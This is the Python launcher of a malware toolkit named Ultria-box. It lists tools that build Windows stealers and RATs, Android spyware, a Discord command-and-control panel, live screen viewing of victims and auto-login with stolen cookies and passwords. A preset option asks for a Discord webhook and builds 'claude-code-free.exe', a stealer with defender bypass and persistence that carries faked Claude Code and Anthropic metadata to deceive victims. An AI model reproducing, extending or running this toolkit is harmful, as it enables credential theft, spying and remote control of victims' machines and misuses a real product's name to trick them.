# Copyright (c) RedTiger
# See the file 'LICENSE' for copying permission

from Config.Util import *
from Config.Config import *

import os, sys, subprocess, time

Title("Ultria-box")

#  TOOL REGISTRY

_TOOLS = [
    ("1.py",                   "Windows Virus Builder",  "Build obfuscated .exe / stealer / RAT for Windows"),
    ("2.py",                   "Android Virus Builder",  "Generate APK with spyware, keylogger & C2"),
    ("3.py",                   "Discord C2 Controller",  "Manage victims & issue commands via Discord"),
    ("4.py",                   "Remote Screen View",     "Real-time screen stream from active victims (GUI)"),
    ("5.py",                   "Virus Remover",          "Detect & remove RATs — registry, processes, files"),
    ("Discord-ZIP-Lister.py",  "Discord ZIP Lister",     "List & download ZIP archives sent to the C2 channel"),
    ("Auto-Connect.py",        "Auto-Connect",           "Auto-login to accounts using stolen cookies & passwords"),
]

#  ASCII ART  —  (drawing  +  block-text logo)  ×  one per tool

_DRAW_MAIN = r"""
X$$$$$$$&$XxXxxX$$XxxxxxxxxXx=xXxxXXX$$$X&$XxxXx=+x=xX+x$$
XXXXX$$XX$XXxxXxxx=xXxxXx+=$XXx=x==++==xxxxxX$X=xxXxxXXx=x
==xx=xx+xx===++=====xxx+X++X+=x+==+xx=+=x+===XXXXXXX=+xx==
=+++xx+;x+++++;=+++x+xx+=X:=x=x=;Xx=$x=Xxxx=XxxxxXXxxxx===
==x===+++;x+;+;;===xx+=x=xX;;;xX;;xxX=xxXXX=xXxxxXXXx====x
x=X++xxx=+$+;+++=+=+X+xxx;x&+;+XXx=xXxXX$xxxxxXx=xxxx=xXXX
===x=++==xX+==+==x==x++$+;:=Xx$++XXXXX$$XXxXx=Xxxx=x=xXX$X
+==xx=++===x+=====;;:=XXxX$==XX=+x$&$$$$$Xx=====Xxx+==xxXx
==++========+++==+++xXxxxx====++====x$$$$$X=========x=xx==
===x=======+++;=xxX=x=+xxx=xx===========xXx===============
==xxxxxxx=+=+=xXxxx=;:;+xxxx=x====xxx=++==x=+=============
====xxxxx+====xxx=xxx==+=========+=x========+=======++====
==+==xx=+++=========x===x=====+x=+====+=x+====+=====++====
=+===+=++=+===+==========+==+====+++==x==+==+===+===+=====
"""

_TEXT_MAIN = r"""
888     888888   888888888888888888b. 8888888       d8888 
888     888888       888    888   Y88b  888        d88888 
888     888888       888    888    888  888       d88P888 
888     888888       888    888   d88P  888      d88P 888 
888     888888       888    8888888P"   888     d88P  888 
888     888888       888    888 T88b    888    d88P   888 
Y88b. .d88P888       888    888  T88b   888   d8888888888 
 "Y88888P" 88888888  888    888   T88b8888888d88P     888
888888b.   .d88888b.Y88b   d88P 
888  "88b d88P" "Y88bY88b d88P  
888  .88P 888     888 Y88o88P   
8888888K. 888     888  Y888P    
888  "Y88b888     888  d888b    
888    888888     888 d88888b   
888   d88PY88b. .d88Pd88P Y88b  
8888888P"  "Y88888P"d88P   Y88b
"""

_DRAW_WIN = r"""
@@@@@#################@@@@&&&$$$XXxxx==x
######@@@@@&&&$$@#XXxxx================x
$XXXxxx========+&#=+===================x
================&#x====================x
================&#x====================x
================&#x====================x
================&#x====================x
===============+&#=+=++++++++++++++++=+=
XXXXXXXXXXXXXXXX@#$$$$$$$$$$$$$$$$$$$$$$
XXXXXXXXXXXXXXXX&#$$$$$$$$$$$$$$$$$$$$$$
===============+&#=+=++++++++++++++++=+=
================&#x====================x
================&#x====================x
================&#x====================x
================&#x====================x
$XXXxxx========+&#=+===================x
#######@@@@&&&$$@#XXXxxx===============x
@@@@@##################@@@@&&&$$$XXxxx=x
"""

_TEXT_WIN = r"""
_    _ _____ _   _  ______ _   _ _____ _    ______ 
| |  | |_   _| \ | | | ___ \ | | |_   _| |   |  _  \
| |  | | | | |  \| | | |_/ / | | | | | | |   | | | |
| |/\| | | | | . ` | | ___ \ | | | | | | |   | | | |
\  /\  /_| |_| |\  | | |_/ / |_| |_| |_| |___| |/ / 
 \/  \/ \___/\_| \_/ \____/ \___/ \___/\_____/___/
"""

_DRAW_ANDROID = r"""
#######@@= .x#@@@@@@@#x. =@@#######
######@@#@;..;;:;;;:;;..;@#@@######
#####@##x;::;;;;;;;;;;;::;x##@#####
@@@@@#&:.;;;.;;;;;;;;;.;;;.:&#@@@@@
#####@.:+;;;;;;;;;;;;;;;;;+:.@#####
@Xx=Xx ;:::::::::::::::::::; xX=xX@
:.:::  ;:::::::::::::::::::;  :::.:
 ;;;+:.;;;;;;;;;;;;;;;;;;;;;.:+;;; 
 ;;;;:.;;;;;;;;;;;;;;;;;;;;;.:;;;; 
 ;;;;:.;;;;;;;;;;;;;;;;;;;;;.:;;;; 
 ;;;;:.;;;;;;;;;;;;;;;;;;;;;.:;;;; 
 :;;;..;;;;;;;;;;;;;;;;;;;;;..;;;: 
X;;;;. +;;;;;;;;;;;;;;;;;;;+ .;;;;X
##@@@&.:::;;;;;;;:;;;;;;;:::.&@@@##
@@####@x== ;;;;:.=.:;;;; ==x@####@@
##@@#@###@ ;;;;:.#.:;;;; @###@#@@##
######@@@& :;;;:.@.:;;;: &@@@######
########@#X:::::X@X:::::X#@########
"""

_TEXT_ANDROID = r"""
___   _   _____________ _____ ___________ 
 / _ \ | \ | |  _  \ ___ \  _  |_   _|  _  \
/ /_\ \|  \| | | | | |_/ / | | | | | | | | |
|  _  || . ` | | | |    /| | | | | | | | | |
| | | || |\  | |/ /| |\ \ \_/ /_| |_| |/ / 
\_| |_/\_| \_/___/ \_| \_|\___/ \___/|___/
"""

_DRAW_C2 = r"""
                      .  ◉  .
                    .:|   |:.
                  .::  \  /  ::.
                .:      \/      :.
               /‾‾‾‾‾‾‾/\‾‾‾‾‾‾‾\
              |  victim  ◉ server  |
               \______/  \______/
                    |        |
                   ═╪════════╪═
                    ◦ DISCORD ◦
"""

_TEXT_C2 = r"""
_____  _____   _____ ___________ _     
/  __ \/ __  \ /  __ \_   _| ___ \ |    
| /  \/`' / /' | /  \/ | | | |_/ / |    
| |      / /   | |     | | |    /| |    
| \__/\./ /___ | \__/\ | | | |\ \| |____
 \____/\_____/  \____/ \_/ \_| \_\_____/
"""

_DRAW_VIEW = r"""
          ╔══════════════════╗
          ║  .-----------.  ║
          ║ /  .-------. \  ║       << live stream >>
          ║( ( (   ●   ) ) )║
          ║ \  '-------' /  ║
          ║  '-----------'  ║
          ╚════════╤═════════╝
                  ███
              ════╩═╩════
"""

_TEXT_VIEW = r"""
______ ________  ________ _____ _____ 
| ___ \  ___|  \/  |  _  |_   _|  ___|
| |_/ / |__ | .  . | | | | | | | |__  
|    /|  __|| |\/| | | | | | | |  __| 
| |\ \| |___| |  | \ \_/ / | | | |___ 
\_| \_\____/\_|  |_/\___/  \_/ \____/
"""

_DRAW_CLEAN = r"""
;;;;;++;;::::::::::;;;+;;;;;;;;;;;;;;::::;:;;;::::
::;;;;;;::::::::;;;;;+;:::::::;;:;;;:::;;;;;::::;;
:::++;;;;:::::::::::;;::::::::;:::::::;+;;;::;;;;;
;;;++::;:::::;+;:..:;::::::;:::::::::++;::;+;;;;;;
::++:::::::::==+=;:;;:::;++x=::::::;;;::;;;;:;;;;;
:;x;:;:::::::;xxxXxXXXXxx=x$x::::;+;;;;;;::;;;;;;;
:==;;::::::::;XxXXXX$X$XXxX$=:;;;;;;;;::::;;::::::
+=;;::::::;::+===XXxXxXXXXX$x;+;;;::::::::::::::::
=+::;:;:::;::=x=xxx==XXXXXX$X;;::::;;:::::::::::::
+::;;;::::::;+====xxx$$xxxxX+:::::;:::..::::::::::
:::;+;;;::::;;+=++++x===+xXx;;::::::::......::::::
;:;;;;:::::;:;++=====xxXXXXX+...:::::......:::::::
::;::::::;;;+;+++==x$&&&$$X$&x;:::...:::...::.::::
:;;::::::;::;+++;+=xxX$$XXX$&@@$Xx;:.....::::.::::
:;::;:::::.:;::;+=====xXXXX$&&&&&&$Xx;...+=:::::::
;:..::.:::..;;;+====xXXxxX$$$&@@&$$$$$X=;+;;;::::;
;:.....:;..;+;;==XXxxXX$$xx$$&@@&$$$X$$&$=::::::;:
::::..::;:++::;;==X$X==XXX$$&&@&&$&$$$$$&&x::::;;:
......:=+::.:;;++=X$$++X$XX$$&$$$$XXXXXXX$&$;:;;;;
.  .;+;;:.::::;;++xxx=+==xx$X$$xX$$$$XxxXX$&$;:.:;
"""

_TEXT_CLEAN = r"""
_____  _      _____  ___   _   _  ___________ 
/  __ \| |    |  ___|/ _ \ | \ | ||  ___| ___ \
| /  \/| |    | |__ / /_\ \|  \| || |__ | |_/ /
| |    | |    |  __||  _  || . ` ||  __||    / 
| \__/\| |____| |___| | | || |\  || |___| |\ \ 
 \____/\_____/\____/\_| |_/\_| \_/\____/\_| \_|
"""

_DRAW_ZIP = r"""
         ╔══════════════════════════════╗
         ║  .zip  .zip  .zip  .zip  .zip║
         ║ ┌────┐┌────┐┌────┐┌────┐    ║
         ║ │part││part││part││FULL│    ║
         ║ │1of3││2of3││3of3││.zip│    ║
         ║ └────┘└────┘└────┘└────┘    ║
         ║          ▼  reassemble       ║
         ║     ┌──────────────┐        ║
         ║     │  FULL.zip ✓  │        ║
         ║     └──────────────┘        ║
         ╚══════════════════════════════╝
                  DISCORD  C2
"""

_TEXT_ZIP = r"""
______  ___ _____ _____  _      _____ _____ _____ ___________
|__  / |_ _||  _  \ ___ \| |    |_   _/  ___|_   _||  ___| ___ \
   / /   | | | |_/ / |_/ /| |      | | \ `--.  | |  | |__ | |_/ /
  / /    | | |  __/|    / | |      | |  `--. \ | |  |  __||    /
./ /___  | | | |   | |\ \ | |____ _| |_/\__/ / | |  | |___| |\ \
\_____/ |___/\_|   \_| \_|\_____/ \___/\____/  \_/  \____/\_| \_|
"""

_DRAW_AC = r"""
         ╔══════════════════════════════════╗
         ║  ZIP  ──►  cookies.txt           ║
         ║       ──►  passwords.txt         ║
         ║                 │                ║
         ║         ┌───────▼────────┐       ║
         ║         │  domain cards  │       ║
         ║         │  discord  ★    │       ║
         ║         │  google   ★    │       ║
         ║         │  github   ★    │       ║
         ║         └───────┬────────┘       ║
         ║                 │                ║
         ║       CDP inject / autofill      ║
         ╚══════════════════════════════════╝
"""

_TEXT_AC = r"""
 ___  ___  ________  ________  ________  ________  ________   ________   _______   ________ _________
|\  \|\  \|\   __  \|\   __  \|\   __  \|\   ____\|\   __  \ |\   ___  \|\  ___ \ |\   ____\\___   ___\
\ \  \\\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \___|\ \  \|\  \\ \  \\ \  \ \   __/|\ \  \___\|___ \  \_|
 \ \   __  \ \  \\\  \ \   _  _\ \  \\\  \ \  \    \ \  \\\  \\ \  \\ \  \ \  \_|/_\ \  \       \ \  \
  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \\\  \ \  \____\ \  \\\  \\ \  \\ \  \ \  \_|\ \ \  \____   \ \  \
   \ \__\ \__\ \_______\ \__\\ _\\ \_______\ \_______\ \_______\\ \__\\ \__\ \_______\ \_______\   \ \__\
    \|__|\|__|\|_______|\|__|\|__|\|_______|\|_______|\|_______| \|__| \|__|\|_______|\|_______|    \|__|
"""

_DRAWS = [
    (_DRAW_WIN,     _TEXT_WIN,     "Windows Virus Builder"),
    (_DRAW_ANDROID, _TEXT_ANDROID, "Android Virus Builder"),
    (_DRAW_C2,      _TEXT_C2,      "C2 Controller"),
    (_DRAW_VIEW,    _TEXT_VIEW,    "Remote Screen View"),
    (_DRAW_CLEAN,   _TEXT_CLEAN,   "Virus Remover"),
    (_DRAW_ZIP,     _TEXT_ZIP,     "Discord ZIP Lister"),
    (_DRAW_AC,      _TEXT_AC,      "Auto-Connect"),
]

#  HELPERS

# Root = directory containing Ultria.py  (frozen: use exe location)
if getattr(sys, 'frozen', False):
    _ROOT = os.path.dirname(sys.executable)
else:
    _ROOT = os.path.dirname(os.path.abspath(__file__))

# Python interpreter to launch sub-scripts (frozen: look in PATH)
if getattr(sys, 'frozen', False):
    import shutil as _shutil
    _PYTHON = _shutil.which('python') or _shutil.which('python3') or 'python'
else:
    _PYTHON = sys.executable

def _header():
    Clear()
    Title("Ultria-box")
    print(MainColor2(_DRAW_MAIN))
    print(f"{yellow}{_TEXT_MAIN}{white}")
    print(f"  {red}{'─'*72}{white}")
    print(f"  {red}/pecorio-dev/Ultria{white}")
    print(f"  {red}{'─'*72}{white}\n")


def _run_tool(idx):
    """Show per-tool banner then launch the script."""
    draw, text, name = _DRAWS[idx]
    filename, _, desc = _TOOLS[idx]

    Clear()
    print(MainColor2(draw))
    print(f"{yellow}{text}{white}")
    print(f"\n  {red}{'─'*68}{white}")
    print(f"  {white}{desc}")
    print(f"  {red}{'─'*68}{white}")
    print(f"\n  {WAIT} Launching {red}{name}{white}...\n")
    time.sleep(0.6)

    script = os.path.join(_ROOT, filename)
    if not os.path.isfile(script):
        print(f"  {ERROR} File not found: {white}{script}")
        input(f"\n  {INFO} Press Enter to return...")
        return

    try:
        proc = subprocess.Popen([_PYTHON, script], cwd=_ROOT)
        proc.wait()
    except Exception as e:
        print(f"  {ERROR} Failed to launch: {white}{e}")
        input(f"\n  {INFO} Press Enter to return...")


def _preset_build():
    """Prompt for a Discord webhook then build the preset claude-code-free payload via 1.py --preset."""
    Clear()
    print(f"  {red}{'─'*68}{white}")
    print(f"  {red}  Preset Build · claude-code-free{white}")
    print(f"  {red}{'─'*68}{white}\n")
    print(f"  {INFO} Stealer: all modules except keylogger & Discord injection.")
    print(f"  {INFO} Malware: anti-VM, startup, melt, defender bypass, C2 heartbeat,")
    print(f"  {INFO}          scheduled task, process disguise, timing evasion, encryption.")
    print(f"  {INFO} Metadata: Claude Code · Anthropic Inc. · 0.2.38")
    print(f"  {INFO} Output  : claude-code-free.exe\n")

    wh = input(f"  {INPUT} Discord Webhook URL: ").strip()
    if not wh.startswith("https://discord.com/api/webhooks/"):
        print(f"\n  {ERROR} Invalid webhook URL — must start with https://discord.com/api/webhooks/")
        input(f"\n  {INFO} Press Enter to return...")
        return

    script = os.path.join(_ROOT, "1.py")
    if not os.path.isfile(script):
        print(f"  {ERROR} 1.py not found: {white}{script}")
        input(f"\n  {INFO} Press Enter to return...")
        return

    print(f"\n  {WAIT} Launching preset build...\n")
    try:
        proc = subprocess.Popen(
            [_PYTHON, script, "--preset", wh],
            cwd=_ROOT
        )
        proc.wait()
    except Exception as e:
        print(f"  {ERROR} Build failed: {white}{e}")
        input(f"\n  {INFO} Press Enter to return...")


#  MAIN LOOP

try:
    Slow(MainColor2(_DRAW_MAIN) + f"\n{yellow}{_TEXT_MAIN}{white}\n")

    while True:
        _header()

        print(f"  {red}╔══ Tools ══════════════════════════════════════════════════════╗{white}")
        for i, (fname, name, desc) in enumerate(_TOOLS, 1):
            print(f"  {red}║  [{white}{i}{red}]{white}  {name:<28} {red}·{white} {desc}")
        print(f"  {red}╠══ Build ══════════════════════════════════════════════════════╣{white}")
        print(f"  {red}║  [{white}B{red}]{white}  Preset Build  {red}·{white}  claude-code-free.exe  (full stealer + C2)")
        print(f"  {red}╠══ Exit ═══════════════════════════════════════════════════════╣{white}")
        print(f"  {red}║  [{white}0{red}]{white}  Exit")
        print(f"  {red}╚═══════════════════════════════════════════════════════════════╝{white}\n")

        choice = input(MainColor(
            f" ┌──({white}{username_pc}@ultria-box)─{red}[{white}~/launcher]\n └─{white}$ {reset}"
        )).strip().lower()

        if choice == "0":
            print(f"\n  {INFO} Goodbye.\n")
            break
        elif choice == "b":
            _preset_build()
        elif choice.isdigit() and 1 <= int(choice) <= len(_TOOLS):
            _run_tool(int(choice) - 1)

except KeyboardInterrupt:
    print(f"\n  {INFO} Interrupted.")

Continue()
